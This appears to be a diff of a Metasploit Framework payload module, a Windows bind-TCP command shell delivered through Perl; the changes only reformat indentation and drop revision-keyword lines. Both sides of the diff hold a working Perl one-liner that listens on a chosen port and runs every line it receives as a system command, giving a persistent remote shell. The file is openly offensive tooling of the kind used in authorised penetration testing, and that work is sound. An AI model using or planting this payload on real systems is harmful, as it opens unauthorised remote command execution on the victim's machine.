@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -16,44 +12,43 @@ require 'msf/base/sessions/command_shell_options'
 
 module Metasploit3
 
-	include Msf::Payload::Single
-	include Msf::Sessions::CommandShellOptions
+  include Msf::Payload::Single
+  include Msf::Sessions::CommandShellOptions
 
-	def initialize(info = {})
-		super(merge_info(info,
-			'Name'          => 'Windows Command Shell, Bind TCP (via Perl)',
-			'Version'       => '$Revision$',
-			'Description'   => 'Listen for a connection and spawn a command shell via perl (persistent)',
-			'Author'        => ['Samy <samy@samy.pl>', 'cazz', 'patrick'],
-			'License'       => BSD_LICENSE,
-			'Platform'      => 'win',
-			'Arch'          => ARCH_CMD,
-			'Handler'       => Msf::Handler::BindTcp,
-			'Session'       => Msf::Sessions::CommandShell,
-			'PayloadType'   => 'cmd',
-			'Payload'       =>
-				{
-					'Offsets' => { },
-					'Payload' => ''
-				}
-			))
-	end
+  def initialize(info = {})
+    super(merge_info(info,
+      'Name'          => 'Windows Command Shell, Bind TCP (via Perl)',
+      'Description'   => 'Listen for a connection and spawn a command shell via perl (persistent)',
+      'Author'        => ['Samy <samy@samy.pl>', 'cazz', 'patrick'],
+      'License'       => BSD_LICENSE,
+      'Platform'      => 'win',
+      'Arch'          => ARCH_CMD,
+      'Handler'       => Msf::Handler::BindTcp,
+      'Session'       => Msf::Sessions::CommandShell,
+      'PayloadType'   => 'cmd',
+      'Payload'       =>
+        {
+          'Offsets' => { },
+          'Payload' => ''
+        }
+      ))
+  end
 
-	#
-	# Constructs the payload
-	#
-	def generate
-		return super + command_string
-	end
+  #
+  # Constructs the payload
+  #
+  def generate
+    return super + command_string
+  end
 
-	#
-	# Returns the command string to use for execution
-	#
-	def command_string
+  #
+  # Returns the command string to use for execution
+  #
+  def command_string
 
-		cmd = "perl -MIO -e \"while($c=new IO::Socket::INET(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept){$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>}\""
+    cmd = "perl -MIO -e \"while($c=new IO::Socket::INET(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept){$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>}\""
 
-		return cmd
-	end
+    return cmd
+  end
 
 end
